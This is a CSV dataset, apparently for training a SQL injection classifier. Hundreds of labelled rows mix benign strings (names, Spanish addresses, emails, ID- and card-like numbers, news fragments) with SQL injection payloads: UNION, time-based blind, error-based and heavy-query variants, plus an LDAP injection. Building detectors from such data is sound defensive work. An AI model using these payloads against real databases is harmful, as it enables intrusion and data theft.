Sentence,Label
"-4236' )  union all select 2076,2076,2076,2076,2076,2076,2076,2076,2076,2076#",1
"vallbona, 72 3?b",0
benito@mayoriasilenciosa.mu,0
"-7119"" )  or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and  ( ""rmzm"" = ""rmzm",1
jaye,0
"1, ( select  ( case when  ( 5154 = 5154 )  then 1 else 5154* ( select 5154 from master..sysdatabases )  end  )  )  ",1
boyadgian@campanasextractoras.tv,0
"1"" )  as aifd where 5962 = 5962",1
kantorkova@salaparis.je,0
"-2790%"" )  union all select 5070,5070#",1
"1"" )  where 2758 = 2758 union all select null,null,null,null,null,null,null--",1
koprulu,0
"org/?option = com_k2  <a href = ""http://corfopym",0
"1' )  where 8628 = 8628 union all select null,null,null--",1
1 )  as imdt where 6431 = 6431,1
estasio,0
 &quot; The big issue understandable: Parents simply &apos;t want young daughters periods ,0
" Addressing called &quot; flurry news &quot; cancellations , Obama urged Americans receiving notices shop new coverage marketplace ",0
1689,0
8903,0
xaubet sorolla,0
"rua bamio, 190 11?h",0
"1'|| ( select 'ativ' from dual where 4746 = 4746 union all select null,null,null,null#",1
sant vicen de torell,0
40146763x,0
57738017j,0
50316,0
tajahuerce,0
"1%'  )  )   procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1
viataiano,0
 select * from users where id = '1' + $+%$ or 1 = 1 -- 1',1
"moncayo 46,",0
cabezn de pisuerga,0
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and   (  (   ( 'gsup' = 'gsup",1
1 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #,1
93310194e,0
30555153k,0
cinda,0
"1 union all select null,null,null,null,null#",1
-3750'+ ( select alpu where 3911 = 3911 order by 1--,1
v433g3o5i6r79,0
"1"" or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and ""utzr"" like ""utzr",1
"1%'  )  )   and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
9006,0
"paraje contador 158, 12d",0
3368084974828178,0
rozsabegyi.kasker@mirata.ls,0
21959527r,0
"-2782"" union all select 2109,2109,2109#",1
"-7691"" or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
rachael,0
6ho7rca5u16,0
net 홍길동 yoda-master@hanmail,0
mastroma,0
paseo arco del ladrillo 48 10?h,0
honduras 105,0
1' )  where 6244 = 6244 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) --,1
bielat,0
4403,0
gowan,0
" One reason choosing 2014 celebrate 1,250-year anniversary way , also coincides 40th anniversary Community Reform (Gemeindereform)",0
"-9145' )  as xyya where 8950 = 8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",1
"-7418 union all select 1340,1340,1340,1340,1340#",1
"c/ torregrossa, 3",0
"1%' )  and make_set ( 8403 = 8403,8899 )  and  ( '%' = '",1
25152,0
" The next morning , team begins meeting hundreds patients ",0
28194,0
daly@diagnosticoradiologico.jm,0
malh5jo,0
llers marquile,0
"-6527'  )  )   union all select 5053,5053,5053,5053--",1
"1""  )  )   )  and elt ( 3114 = 3114,sleep ( 5  )  )  #",1
05217,0
yesenia,0
1' where 1045 = 1045 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )  --,1
94721255x,0
levitin,0
net /usr/lib/sendmail bbs338 12 view 120,0
dina,0
rainmake,0
9717,0
1' )  where 7478 = 7478,1
"1"" )  where 2445 = 2445",1
calabazas de fuentiduea,0
"1  )  )   and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
-5327'  )  )   )  or 1606 = 6099,1
"1'  )  )   )  or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and   (  (   ( 'swua' like 'swua",1
04087524x,0
"1' )  where 3375 = 3375 or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
" Fay &apos;s innovation extended years , recently New York Comedy Festival ",0
"1"" )  as xaye where 5343 = 5343 and 4355 = 7475#",1
54738650f,0
8388803635652672,0
1' )  and  ( 7603 = 3634 ) *3634,1
" Schiltach contribute EUR 220,000 project ",0
mwa,0
65223156d,0
"1' )  and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
49511678s,0
"avenida de europa 153,",0
"-1678"" where 3706 = 3706 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1
09390,0
joux@viajessolomujeres.nf,0
ambrose,0
ersch,0
mazursky@mundo-deportivo.mx,0
3483759032039074,0
maitn,0
"1' in boolean mode )  union all select null,null--",1
" Dostoevsky - massive oeuvre - considered revealer apologist Russian soul , Philip K",0
"riba, la",0
"zoma, la",0
younger,0
de jaime,0
" This current machine translation (MT) systems perform translation sentence level, various models used MT trained segmented sentences many algorithms inside MT exponential complexity regard length inputs",0
grajera sampol,0
7810892855835467,0
"-5170'  )  )   as ovbf where 4833 = 4833 union all select 4833,4833,4833,4833--",1
riggsbee,0
8159487475137064,0
" The priority must jobs growth Britain , findings poll show , business means renewed focus trade fundamental change Brussels &quot; regulatory approach ",0
select  ( case when  ( 7163 = 1777 )  then 1 else 7163* ( select 7163 from master..sysdatabases )  end ) --,1
"1'+ ( select rwse where 9843 = 9843 union all select null,null,null,null,null,null,null--",1
akio,0
"1'  )  )   or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  'dreq' = 'dreq",1
"1"" and 7533 = 7533 and ""dqjp"" = ""dqjp",1
1  )  )   )  and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and   (  (   ( 1601 = 1601,1
16118,0
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and  ( 'hube' = 'hube",1
07608453f,0
'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 1 )  waitfor delay '0:0:2' --,1
1 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )  -- jduw,1
1' and  ( 5116 = 1602 ) *1602,1
2036710936767005,0
 FAA advisory committee members expressed mixed feelings whether use devices presents risk ,0
"1' )  as wpom where 2620 = 2620 and elt ( 3114 = 3114,sleep ( 5  )  )  #",1
suen,0
"c/ serrano, 125,",0
"1' )  where 3255 = 3255 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
strick,0
3842504207322211,0
"1' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and 'ybjo' = 'ybjo",1
pisu@shamballa-pneuma.bu,0
ron,0
6054,0
33500,0
astigarraga,0
32252,0
95554434z,0
" Mr Ditta honouring profession , dishonouring ",0
dcada,0
-5147 or  ( 8459 = 8459 ) *4906,1
7a03i9a08rio,0
8935,0
"camino hoya mondongo, 124",0
"1%""  )  )   )  and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
* ( | ( objectclass = *  )  )  ,1
colliti.shale@ropadegolf.com.dd,0
lippens27,0
"1""  )  )   and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  ""quni"" = ""quni",1
"1"" )  as ckoi where 4674 = 4674 union all select null,null,null,null,null,null,null,null,null,null#",1
morandy bosquet,0
"1%' )  and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and  ( '%' = '",1
1%' )  union all select null--,1
1142,0
carrer de merida 35 8-c,0
"1%"" )  and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and  ( ""%"" = """,1
 ( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and   (  (   ( 'jirc' = 'jirc,1
1  )  )   )  and 6358 = 6735,1
"-8093""  )  )   as oboi where 1476 = 1476 union all select 1476,1476,1476,1476#",1
seni+l,0
hassold,0
" As soon acted spoken eclat, committed person, watched sympathy hatred hundreds, whose affections must enter account",0
"-4586 union all select 2068,2068,2068,2068--",1
opopnaco,0
woolgar@awat.gov,0
1 )  where 8041 = 8041,1
petunia,0
1  )  )   as eveb where 7567 = 7567,1
42342,0
azuara,0
45555264s,0
 This reported broadcaster SABC ,0
raimund,0
 I hear preacher announce text topic expediency one institutions church,0
0nsu2iso,0
"1'|| ( select 'ggfx' where 4932 = 4932 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5  )  )  ||'",1
starr-fjelmose@cdgranadabaila.travel,0
"1""  )  )   )  and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and   (  (   ( ""pnsz"" like ""pnsz",1
"1'  )  )   )  or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and   (  (   ( 'cylu' = 'cylu",1
juan cruz,0
"-4385%'  )  )   union all select 6694,6694,6694,6694,6694,6694,6694,6694,6694,6694#",1
21387,0
arenas burrull,0
" select * from users where id = 1.*\ union select null,@@VERSION -- 1",1
5509893161352437,0
"1"" and elt ( 1210 = 1210,sleep ( 5  )  )   and ""zhxm"" = ""zhxm",1
rattenbury_roquette@ibizasounds.gh,0
sacudir,0
lupien,0
barnechea,0
84443986s,0
94987112x,0
02295767e,0
"obispo diego aponte, s/n",0
knorp5,0
8030e,0
iwasaki@chaqueta.com.asia,0
1'+ ( select 'xbyn' where 6881 = 6881,1
"1'|| ( select 'wyng' from dual where 2157 = 2157 union all select null,null--",1
413f1go,0
" And Congress &apos;t agree whether proceed , several states waiting ",0
poderdante,0
" Renamo &apos;s share vote declining since 1992 , newer party , Democratic Movement Mozambique (MDM) formed former Renamo member , expected improve showing elections ",0
1 )  and 3861 = 5813--,1
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  (   ( ""%"" = """,1
"1%""  )  )   ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users )  and   (  (  ""%"" = """,1
munbrega,0
0208625948650928,0
4945470408027302,0
"juan de grijalba, 23",0
"-9281 )  where 8363 = 8363 or make_set ( 8220 = 5127,5127 ) --",1
siena 76 8-c,0
"1'  )  )   or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (  'jfwt' like 'jfwt",1
"1  )  )   )  and elt ( 3114 = 3114,sleep ( 5  )  )  #",1
"1%"" )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( ""%"" = """,1
luna,0
|,1
1' )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and  ( 'dqoz' like 'dqoz,1
" &quot; Motorists would attracted participate value benefits offers , &quot; says city planning document ",0
torrent refojo,0
calle cierzo 126,0
benifallet,0
 You could call Dostoevsky USA ,0
" The instability added frustrations government , says Fernando Lima , head Mediacoop , independent media company , many people also concerned corruption , slow pace development recent spate kidnappings ",0
weatherhead_calandra9@velaconsultores.au,0
"1"" or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1
dalenna,0
" His stories inspired film producers Ridley Scott , Paul Verhoeven Steven Spielberg ",0
" &quot; I opinion sufficient basis exists &quot; formal investigation , said ",0
09341,0
"1  )  )   as npdl where 5796 = 5796 and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
linas,0
6034871098442134,0
gidget,0
 I hope days heard last conformity consistency,0
57584234p,0
-7199'|| ( select 'ssty' where 5406 = 5406 order by 1#,1
"1 )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  ",1
ziga,0
"1 where 5627 = 5627 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
d0n0a1o8,0
gittins,0
"5 million Euro , value last year EUR 2",0
"calle licurgo, 39",0
" end and   (  (  ""cxoi"" = ""cxoi",1
troguet,0
4211,0
select sleep ( 5 )  and   (  (  'ilcv' = 'ilcv,1
gaftea,0
hervey@annoyanc.eh,0
"-5667%'  )  )   or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  '%' = '",1
felleghy@zafranet.md,0
"-5027%""  )  )   or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (  ""%"" = """,1
treen2,0
tortolito,0
"1'+ ( select pxrg where 5589 = 5589 or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
04607227m,0
"1%' and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
verdusco,0
entrala,0
 The completion essentially initial stage destruction significant milestone ambitious timeline aims destroy Damascus &apos; chemical weapons mid-2014 ,0
-2679'  )  )   )  or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( 'cutk' like 'cutk,1
"-8790' )  or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( 'nsze' like 'nsze",1
brewton,0
nolberto,0
"1' and make_set ( 2942 = 8200,8200 )  and 'jnhv' like 'jnhv",1
 Critics Sen,0
philipp.castella@biopoint.vc,0
" From 2005 2007 , hosted show TV Land called &quot; Sit Down Comedy David Steinberg ",0
"1"" )  where 5719 = 5719 rlike sleep ( 5 ) --",1
" Inquiries revealed Ditta &quot; regular user &quot; Class A drug tests found traces cocaine hair , wallet credit cards ",0
elefa_n7ina,0
"calle europa s/n,",0
iznate,0
" &quot; He &apos;s hero , without doubt , &quot; O &apos;Malley said ",0
"-6214"" union all select 3323,3323#",1
uriz carmona,0
disipar,0
3064,0
1 )  or sleep ( 5 ) ,1
san vicente de alcntara,0
garrard,0
ajenador,0
"1' )  where 8211 = 8211 union all select null,null,null,null,null#",1
"1'|| ( select 'wqmz' where 6400 = 6400 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x  )  )  ||'",1
3150,0
ingrid,0
dirosario@errebebe.as,0
"1"" )  as nyui where 2511 = 2511",1
inescourt7@citycvs.mil,0
"-3013' )  where 2027 = 2027 union all select 2027,2027,2027,2027--",1
gilda6@mytanga.om,0
"camaretas 166,",0
9167,0
"1' )  where 9454 = 9454 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
"1""  )  )   as jrld where 3488 = 3488",1
albeta,0
fulivio,0
mullor campllonch,0
 Centre manager Colin Seddon said: &quot; This water rail likely winter migrant Northern Europe got caught strong winds North Sea ,0
palau tanquia,0
40380,0
"-9638  )  )   )  or elt ( 1032 = 1032,3623 )  and   (  (   ( 3679 = 3679",1
c/ garcia morente 129,0
"1"" )  and sleep ( 5 )  and  ( ""fsuf"" like ""fsuf",1
" select * from users where id = 1 or ""%."" or 1 = 1 -- 1",1
gail,0
pegler,0
"-4707' union all select 4414,4414,4414,4414,4414,4414#",1
"1' and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and 'rxdz' = 'rxdz",1
44549,0
6590880314984896,0
"1  )  )   as rbae where 2049 = 2049 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
comn galindez,0
28867747x,0
desplume,0
2533839429419532,0
1'  )  )   as zbkp where 1720 = 1720 and 4110 = 6748#,1
.h0rner3r1,0
cicek0,0
schauer,0
"alamedilla, la",0
" His efforts finally pull fish surface water genuine members audience forget sea question consists merely water bottles , illuminated blue ",0
8069899417976960,0
estable,0
b3zucar,0
47649,0
" national security interests Europeans stay board us respect mutual anti-terrorism endeavors , &quot; Murphy , first-term Democrat chairman Senate Foreign Relations Subcommittee European Affairs , said interview Washington ",0
"1"" and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and ""ouix"" = ""ouix",1
"botellas, 97 9a",0
" end and ""%"" = """,1
99431698f,0
thiel,0
bruzar,0
planthar,0
" &quot; This works logical alternative long term , &quot; said ",0
"1""  )  )   )  and  ( 3020 = 3020 ) *6703 and   (  (   ( ""fqap"" like ""fqap",1
fryd garreta,0
50422961s,0
teobaldo,0
 There lot criticise ,0
6748546919009265,0
rosana,0
trespaderne,0
" An Obama voter &apos;s cry despair I voted President Obama twice , sharing hope possibility change He says Obama worthy efforts thwarted GOP obstructionism Obstructionism &apos;t excuse Obamacare website woes , drone attacks Obama &apos;s 2008 campaign memoir sad reminder might Nathaniel P",0
rogan-darrieux@rocofer.tc,0
"carrer marcos redondo, 132, 8?f",0
1' and sleep ( 5 ) #,1
62128531b,0
eflujo,0
 This changes made fundamental decisions diocese Parish Councils implement satisfactory manner possible ,0
17470,0
"1' and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
arquitectnico,0
"-5798"" or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) ",1
50780,0
"1'  )  )   )  union all select null,null,null,null,null,null,null--",1
4676154156546858,0
"iif ( 1483 = 7301,1,1/0 ) ",1
"calle abeto, 187,",0
ola,0
"1'  )  )   union all select null,null,null,null,null,null,null#",1
" The deed drawn Kirchen (Hausen), time location courthouse ",0
18,0
"-6970""  )  )   or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  ""dyrq"" like ""dyrq",1
6ncanta33n,0
barbads,0
1 )  as qwsa where 2874 = 2874,1
ademaro,0
"1%"" union all select null,null#",1
"-2798'+ ( select 'emui' where 9565 = 9565 union all select 9565,9565,9565,9565--",1
"-2110' or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
